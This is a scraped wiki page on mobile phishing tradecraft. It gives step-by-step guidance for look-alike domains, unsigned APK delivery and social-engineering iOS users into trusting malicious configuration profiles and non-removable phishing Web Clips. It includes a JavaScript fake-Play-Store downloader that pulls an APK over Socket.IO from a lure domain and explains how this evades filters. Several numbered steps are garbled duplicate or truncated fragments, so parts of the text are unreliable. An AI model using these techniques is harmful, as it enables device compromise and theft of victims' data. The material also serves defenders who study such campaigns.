---
title: "Mobile Phishing Malicious Apps"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/generic-methodologies-and-resources/phishing-methodology/mobile-phishing-malicious-apps.html
fetched_at: 2026-09-20T08:53:25Z
license: unspecified
category: mobile
---

# Mobile Phishing & Malicious App Distribution (Android & iOS)

## Attack Flow

1. **SEO/Phishing Infrastructure**  - Register dozens of look-alike domains (dating, cloud share, car service…).
 – Use local language keywords and emojis in the`<title>` element to rank in Google.
 – Host*both* Android (`.apk` ) and iOS install instructions on the same landing page.
2. Register dozens of look-alike domains (dating, cloud share, car service…).
3. **First Stage Download**  - Android: direct link to an *unsigned* or “third-party store” APK.
  - iOS: `itms-services://` or plain HTTPS link to a malicious**mobileconfig** profile (see below).
4. Android: direct link to an
5. **Android Post-install Behaviour**  - C2-gated execution, permission abuse, dropper bypasses, background collection, and other post-install malware behaviour are covered in the dedicated Android Malware Post-Exploitation page below.
6. **iOS Delivery Technique**  - A single **mobile-configuration profile** can request`PayloadType=com.apple.sharedlicenses` ,`com.apple.managedConfiguration` etc. to enroll the device in “MDM”-like supervision.
  - Social-engineering instructions:
    1. Open Settings ➜ *Profile downloaded* .
    2. Tap *Install* three times (screenshots on the phishing page).
    3. Trust the unsigned profile ➜ attacker gains *Contacts* &*Photo* entitlement without App Store review.
  - Open Settings ➜
7. A single
8. **iOS Web Clip Payload (phishing app icon)**  - `com.apple.webClip.managed` payloads can**pin a phishing URL to the Home Screen** with a branded icon/label.
  - Web Clips can run **full‑screen** (hides the browser UI) and be marked**non‑removable** , forcing the victim to delete the profile to remove the icon.<sup>[\[3\]](#references)</sup>
9. **Network Layer**  - Plain HTTP, often on port 80 with HOST header like `api.<phishingdomain>.com` .
  - `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (no TLS → easy to spot).
10. Plain HTTP, often on port 80 with HOST header like

## Android Malware Post-Exploitation

For post-install Android malware tradecraft such as C2, Accessibility abuse, overlays, ATS automation, staged DEX loading, premium SMS, and persistence, see:

[Android Malware Post-Exploitation](../basic-forensic-methodology/android-malware-post-exploitation.html)

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Attackers increasingly replace static APK links with a Socket.IO/WebSocket channel embedded in Google Play–looking lures. This conceals the payload URL, bypasses URL/extension filters, and preserves a realistic install UX.[\[2\]](#references)[\[4\]](#references)

Typical client flow observed in the wild:

## Socket.IO fake Play downloader (JavaScript)

```
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });
// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));
// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```
Why it evades simple controls:

- No static APK URL is exposed; payload is reconstructed in memory from WebSocket frames.
- URL/MIME/extension filters that block direct .apk responses may miss binary data tunneled via WebSockets/Socket.IO.
- Crawlers and URL sandboxes that don’t execute WebSockets won’t retrieve the payload.

See also WebSocket tradecraft and tooling:

## References

- [1] [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Banker Trojan Targeting Indonesian and Vietnamese Android Users](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
